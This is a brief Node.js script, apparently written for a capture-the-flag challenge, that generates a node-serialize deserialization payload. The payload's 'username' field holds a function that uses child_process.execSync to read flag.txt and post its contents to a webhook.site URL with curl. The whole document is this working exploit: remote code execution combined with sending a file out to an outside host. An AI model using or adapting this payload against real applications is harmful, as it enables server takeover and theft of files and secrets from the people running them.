
var serialize = require('node-serialize');

x = {
username : function(){ process.mainModule.require('child_process').execSync('curl https://webhook.site/a962bc5e-aea3-4091-8fca-44b1fa1f3ea5 --data \"$(cat flag.txt)\"'); }
};

console.log("Serialized: \n" + serialize.serialize(x));
